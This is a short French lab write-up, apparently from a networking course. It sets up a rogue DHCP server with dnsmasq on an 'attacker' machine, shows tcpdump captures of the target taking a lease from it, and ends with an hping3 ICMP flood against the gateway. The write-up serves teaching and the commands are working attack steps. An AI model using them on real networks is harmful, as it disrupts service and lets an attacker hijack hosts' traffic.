Le client1 sera l'attaquant tandis que le client2 sera la cible

```
sudo apt-get install dnsmasq
```

```
paph@client1:~$ sudo nano /etc/dnsmasq.conf
```

ajout des lignes suivantes

```
# Définir la passerelle avec l'option 3
dhcp-option=3,10.5.1.254

# vrai dns par exemple 1.1.1.1
dhcp-option=6,1.1.1.1

# range de .240 a .250
dhcp-range=10.5.1.240,10.5.1.250,12h
```

j'ai rendu toutes les ip que enp0s3 avait et j'en ai redemandé via dhcp (depuis le pc cible)

```
paph@client2:~$ sudo ip addr flush dev enp0s3
paph@client2:~$ sudo dhclient enp0s3
```

depuis le pc attaquant (et pendant l'execution de la commande precedente)

```
paph@client1:~$ sudo tcpdump -i enp0s3 -n -s0 -vvv
tcpdump: listening on enp0s3, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:15:32.005854 IP (tos 0x10, ttl 128, id 0, offset 0, flags [none], proto UDP (17), length 328)
    0.0.0.0.68 > 255.255.255.255.67: [udp sum ok] BOOTP/DHCP, Request from 08:00:27:70:89:a2, length 300, xid 0xa7d9581f, secs 3, Flags [none] (0x0000)
          Client-Ethernet-Address 08:00:27:70:89:a2
          Vendor-rfc1048 Extensions
            Magic Cookie 0x63825363
            DHCP-Message (53), length 1: Discover
            Requested-IP (50), length 4: 10.5.1.240
            Hostname (12), length 14: "client2.tp5.b1"
            Parameter-Request (55), length 13:
              Subnet-Mask (1), BR (28), Time-Zone (2), Default-Gateway (3)
              Domain-Name (15), Domain-Name-Server (6), Unknown (119), Hostname (12)
              Netbios-Name-Server (44), Netbios-Scope (47), MTU (26), Classless-Static-Route (121)
              NTP (42)
            END (255), length 0
            PAD (0), length 0, occurs 19
00:15:32.225502 IP (tos 0xc0, ttl 64, id 38475, offset 0, flags [none], proto UDP (17), length 328)
    10.5.1.11.67 > 10.5.1.240.68: [bad udp cksum 0x184a -> 0x1a47!] BOOTP/DHCP, Reply, length 300, xid 0xa7d9581f, secs 3, Flags [none] (0x0000)
          Your-IP 10.5.1.240
          Server-IP 10.5.1.11
          Client-Ethernet-Address 08:00:27:70:89:a2
          Vendor-rfc1048 Extensions
            Magic Cookie 0x63825363
            DHCP-Message (53), length 1: Offer
            Server-ID (54), length 4: 10.5.1.11
            Lease-Time (51), length 4: 43200
            RN (58), length 4: 21600
            RB (59), length 4: 37800
            Subnet-Mask (1), length 4: 255.255.255.0
            BR (28), length 4: 10.5.1.255
            Domain-Name-Server (6), length 4: 1.1.1.1
            Default-Gateway (3), length 4: 10.5.1.254
            END (255), length 0
            PAD (0), length 0, occurs 8
00:15:32.226601 IP (tos 0x10, ttl 128, id 0, offset 0, flags [none], proto UDP (17), length 328)
    0.0.0.0.68 > 255.255.255.255.67: [udp sum ok] BOOTP/DHCP, Request from 08:00:27:70:89:a2, length 300, xid 0xa7d9581f, secs 3, Flags [none] (0x0000)
          Client-Ethernet-Address 08:00:27:70:89:a2
          Vendor-rfc1048 Extensions
            Magic Cookie 0x63825363
            DHCP-Message (53), length 1: Request
            Server-ID (54), length 4: 10.5.1.11
            Requested-IP (50), length 4: 10.5.1.240
            Hostname (12), length 14: "client2.tp5.b1"
            Parameter-Request (55), length 13:
              Subnet-Mask (1), BR (28), Time-Zone (2), Default-Gateway (3)
              Domain-Name (15), Domain-Name-Server (6), Unknown (119), Hostname (12)
              Netbios-Name-Server (44), Netbios-Scope (47), MTU (26), Classless-Static-Route (121)
              NTP (42)
            END (255), length 0
            PAD (0), length 0, occurs 13
00:15:32.235502 IP (tos 0xc0, ttl 64, id 38484, offset 0, flags [none], proto UDP (17), length 329)
    10.5.1.11.67 > 10.5.1.240.68: [bad udp cksum 0x184b -> 0xc1d3!] BOOTP/DHCP, Reply, length 301, xid 0xa7d9581f, secs 3, Flags [none] (0x0000)
          Your-IP 10.5.1.240
          Server-IP 10.5.1.11
          Client-Ethernet-Address 08:00:27:70:89:a2
          Vendor-rfc1048 Extensions
            Magic Cookie 0x63825363
            DHCP-Message (53), length 1: ACK
            Server-ID (54), length 4: 10.5.1.11
            Lease-Time (51), length 4: 43200
            RN (58), length 4: 21600
            RB (59), length 4: 37800
            Subnet-Mask (1), length 4: 255.255.255.0
            BR (28), length 4: 10.5.1.255
            Hostname (12), length 7: "client2"
            Domain-Name-Server (6), length 4: 1.1.1.1
            Default-Gateway (3), length 4: 10.5.1.254
            END (255), length 0
```

depuis le pc cible

```
paph@client2:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:70:89:a2 brd ff:ff:ff:ff:ff:ff
    inet 10.5.1.240/24 brd 10.5.1.255 scope global dynamic enp0s3
       valid_lft 43198sec preferred_lft 43198sec
```

utilisation de hping3 depuis le pc attaquant

```
paph@client1:~/Desktop$ sudo apt-get install hping3
paph@client1:~/Desktop$ sudo hping3 -1 --flood 10.5.1.254
HPING 10.5.1.254 (enp0s3 10.5.1.254): icmp mode set, 28 headers + 0 data bytes
hping in flood mode, no replies will be shown
```
